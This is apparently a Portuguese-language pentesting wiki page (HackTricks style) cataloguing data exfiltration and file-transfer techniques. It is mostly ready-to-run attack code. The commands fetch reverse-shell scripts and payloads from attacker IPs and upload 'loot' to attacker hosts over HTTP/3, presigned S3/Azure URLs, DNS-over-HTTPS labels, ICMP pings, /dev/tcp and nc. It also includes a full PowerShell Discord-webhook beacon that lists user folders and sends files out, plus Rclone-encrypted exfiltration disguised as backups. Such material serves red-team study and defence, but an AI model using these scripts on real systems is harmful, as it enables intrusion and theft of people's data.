# Exfiltração

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> Para ver um exemplo completo de preparação de arquivos coletados em `C:\Users\Public` e exfiltração com Rclone para imitar backups legítimos, confira o fluxo de trabalho abaixo.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Domínios comumente permitidos para exfiltrar informações

Acesse [https://lots-project.com/](https://lots-project.com/) para encontrar domínios comumente permitidos que podem ser abusados.

## Copiar e colar Base64

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### Enviar arquivos

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer exibindo GET e POST (incluindo headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Módulo Python [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **Servidor HTTPS**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

Se os controles de saída estiverem configurados para inspecionar o **TCP/443** clássico, mas forem permissivos com **UDP/443**, forçar o **HTTP/3** pode transferir os dados por **QUIC**, em vez de TLS sobre TCP. O endpoint do atacante precisa ter suporte nativo a HTTP/3 (por exemplo, um reverse proxy ou endpoint de upload que já anuncie `Alt-Svc: h3`).

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

Um artigo de pesquisa de 2025 (QUIC-Exfil) descobriu que os cabeçalhos criptografados e as mudanças dinâmicas de endereço do QUIC podem dificultar a detecção de exfiltração no nível do firewall em comparação com canais baseados em TLS ou DNS. O artigo também demonstrou um método server-preferred-address que disfarça a exfiltração como uma migração de conexão do lado do servidor.<sup>[[9]](#references)</sup>

### Uploads pré-assinados / delegados para armazenamento de objetos

Quando você pode criar ou obter uma **URL assinada** de curta duração, a vítima só precisa de um cliente HTTPS comum. Isso evita instalar SDKs de cloud ou credenciais de longa duração no host.<sup>[[8]](#references)</sup> Isso também pode se misturar ao tráfego comum de armazenamento de objetos.

**Linux / macOS (AWS S3 `PUT` pré-assinado)**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell (AWS S3 `PUT` pré-assinado)**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

Notes:
- URLs pré-assinadas / tokens SAS geralmente definem o escopo do **path**, **método HTTP** e **expiração**.<sup>[[8]](#references)[[10]](#references)</sup>
- Para Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` é obrigatório.<sup>[[10]](#references)</sup>
- Esse padrão funciona bem com `curl`, `Invoke-WebRequest` ou qualquer implant customizado capaz de emitir um `PUT` HTTPS bruto.

### goshs

[goshs](https://github.com/patrickhener/goshs) é uma alternativa em binário único a `python3 -m http.server`.<sup>[[4]](#references)</sup>
Ele oferece upload, download, WebDAV, SFTP, SMB, TLS, autenticação, links de compartilhamento e recursos de colaboração OOB (captura de DNS, SMTP e hashes NTLM).<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## Webhooks (Discord/Slack/Teams) para C2 e Exfiltração de Dados

Webhooks são endpoints HTTPS somente de gravação que aceitam JSON e partes opcionais de arquivos. Geralmente são permitidos em domínios SaaS confiáveis e não exigem OAuth/chaves de API, o que os torna úteis para beaconing e exfiltração de baixo atrito.<sup>[[5]](#references)[[6]](#references)</sup>

Ideias principais:
- Endpoint: o Discord usa https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data com uma parte chamada payload_json contendo {"content":"..."} e partes opcionais de arquivos chamadas file.
- Padrão de ciclo do operador: beacon periódico -> recon de diretórios -> exfiltração direcionada de arquivos -> dump de recon -> sleep. HTTP 204 NoContent/200 OK confirma a entrega.

PoC em PowerShell (Discord):

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

Notas:
- Padrões semelhantes se aplicam a outras plataformas de colaboração (Slack/Teams) que usam seus webhooks de entrada; ajuste a URL e o esquema JSON conforme necessário.
- Para DFIR de artefatos de cache do Discord Desktop e recuperação de webhook/API, consulte a página relacionada abaixo.<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Artefatos do registry como canal de retorno

Quando o código já é executado em um worker de build ou documentação e consegue se autenticar em um registry de pacotes, o próprio registry pode servir como canal de retorno. Nos exemplos do GemStuffer, um payload criou uma **nova gem** com arquivos de resposta obtidos e tentou enviá-la pelo `/api/v1/gems` do RubyGems; outro gravou a resposta obtida em `README.md`, removeu seu loader `.yardopts` e tentou publicar uma **nova versão da mesma gem**. Isso é diferente de um hook executado durante a instalação e exige uma credencial de publicação válida e acesso de saída ao registry.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Uma segunda variante usou a **configuração de webhook do registry como armazenamento**, e não como callback de saída. Ela compactou uma resposta com zlib, codificou-a em Base64 seguro para URL, removeu o preenchimento e dividiu os dados em segmentos numerados de URL com no máximo 220 caracteres. Com uma chave autorizada a gerenciar webhooks, `POST /api/v1/web_hooks` aceita `gem_name` e `url`; `GET /api/v1/web_hooks.json` lista as URLs salvas para essa conta. Segmentos numerados e um marcador de fim permitem que um leitor autorizado reconstrua os dados. O host `example.com` do exemplo era apenas um placeholder dentro do valor salvo, não uma evidência de um endpoint C2 funcional nem de uma entrega bem-sucedida.<sup>[[13]](#references)[[14]](#references)</sup>

```text
POST /api/v1/web_hooks   gem_name=<owned-gem>&url=https://example.com/A000/<chunk>/
GET  /api/v1/web_hooks.json   # read stored URLs using the same account's key
```

Para o caminho inicial de execução de [YARD `.yardopts`](../pentesting-web/dependency-confusion.md#related-pattern-package-controlled-documentation-builds), o canal do registry é apenas uma possibilidade após a execução. Um `POST` bem-sucedido ou um artefato que possa ser lido posteriormente deve ser observado separadamente; as amostras citadas mostram principalmente tentativas de publicação e registro.<sup>[[12]](#references)[[13]](#references)</sup>

## Rclone (exfiltração para cloud/object storage)

Operadores modernos costumam **preparar o loot localmente** e depois usar [Rclone](https://rclone.org/) para fazer a transferência parecer uma tarefa normal de backup ou sincronização. Um padrão prático é:

1. Um remote normal (`s3`, `webdav`, `drive`, `mega`, ...)
2. Um wrapper `crypt` para que **o conteúdo e os nomes dos arquivos sejam criptografados no cliente**
3. Um wrapper `chunker` opcional caso o provedor imponha limites de tamanho de objeto ou você queira unidades de upload menores

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

Notas:
- `crypt` pode criptografar tanto o conteúdo quanto os nomes dos arquivos.<sup>[[3]](#references)</sup>
- `chunker` divide arquivos grandes de forma transparente e os remonta durante o download.<sup>[[11]](#references)</sup>
- `rclone.conf` armazena os segredos de `crypt` em formato **ofuscado**, sem oferecer proteção forte em repouso.<sup>[[3]](#references)</sup> Para operações de curta duração, prefira uma configuração temporária dedicada e remova-a depois. Se precisar mantê-la por mais tempo, prefira o uso de uma configuração criptografada (`RCLONE_CONFIG_PASS` / `--password-command`) a deixar um `rclone.conf` sem proteção no disco.<sup>[[11]](#references)</sup>
- Se o alvo já sincroniza **OneDrive**, **Google Drive** ou **Dropbox**, copiar o loot para o diretório sincronizado pode aproveitar um cliente já aprovado, em vez de instalar um novo binário de transferência.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### Servidor FTP (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### Servidor FTP (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### Servidor FTP (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** cliente

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Kali como servidor

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

Ou crie um compartilhamento SMB **usando samba**:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs) é uma alternativa de binário único que disponibiliza arquivos por SMB e captura hashes NTLM dos clientes que se conectam.<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

O atacante precisa ter o SSHd em execução.

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

Se a vítima tiver SSH, o invasor poderá montar um diretório da vítima no computador do invasor.

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### Baixar arquivo da vítima

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### Fazer upload de arquivo para a vítima

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

agradecimentos a **@BinaryShadow\_**

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

Se o DNS clássico sobre UDP/53 gerar muito ruído ou estiver bloqueado, mas as conexões HTTPS de saída forem amplamente permitidas, o padrão usual de exfiltração por rótulos DNS pode ser encapsulado em requisições **DoH** para um resolver público. Mantenha cada rótulo bem abaixo do limite de 63 bytes e use um alfabeto seguro para DNS, como Base32.

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

No servidor DNS autoritativo de `exf.attacker.tld`, ordene as consultas pelo prefixo numérico e reconstrua o fluxo Base32. Isso mantém o transporte dentro de HTTPS até o resolvedor, em vez de usar o DNS clássico em UDP/53.<sup>[[2]](#references)</sup>

Para ferramentas completas de túnel DNS bidirecional (`iodine`, `dnscat2` etc.), consulte [a página de tunneling](tunneling-and-port-forwarding.md).

## **SMTP**

Se você puder enviar dados para um servidor SMTP, poderá criar um SMTP para receber os dados com python:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs) pode iniciar rapidamente um servidor SMTP para capturar callbacks de e-mail durante cenários de exfiltração OOB.<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

Os e-mails recebidos e os callbacks são exibidos diretamente na saída do terminal.
Pode ser combinado com o servidor de callback DNS para cobertura OOB completa:

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

Por padrão no XP e no 2003 (nos outros, é necessário adicioná-lo explicitamente durante a instalação)

No Kali, **inicie o servidor TFTP**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**Servidor TFTP em Python:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

Na **vítima**, conecte-se ao servidor Kali:

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

Baixe um arquivo com um oneliner em PHP:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**Vítima**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

O programa `debug.exe` não só permite inspecionar binários, como também tem a **capacidade de reconstruí-los a partir de hex**. Isso significa que, ao fornecer o hex de um binário, o `debug.exe` pode gerar o arquivo binário. No entanto, é importante observar que o `debug.exe` tem uma **limitação: só consegue montar arquivos de até 64 kb**.<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

Em seguida, copie e cole o texto no windows-shell e um arquivo chamado nc.exe será criado.

## References

- [1] [Transferindo arquivos para Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Backend `crypt` do Rclone](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord como C2 e as evidências em cache deixadas para trás](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Webhooks do Discord – Executar webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite (analisador de cache)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Fazendo upload de objetos com URLs pré-assinadas - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: Explorando o recurso Server Preferred Address do QUIC para realizar ataques de exfiltração de dados](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (API REST) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Documentação do Rclone](https://rclone.org/docs/#configuration-encryption)
- [12] [RubyHack – Investigação de RubyGems e RubyDoc](https://www.rubyhack.ai/)
- [13] [Pesquisa de segurança da JFrog – Análise do GemStuffer](https://research.jfrog.com/post/gemstuffer-openai-rubygems)
- [14] [API do RubyGems.org – Métodos de gems e webhooks](https://guides.rubygems.org/rubygems-org-api/)
{{#include ../banners/hacktricks-training.md}}
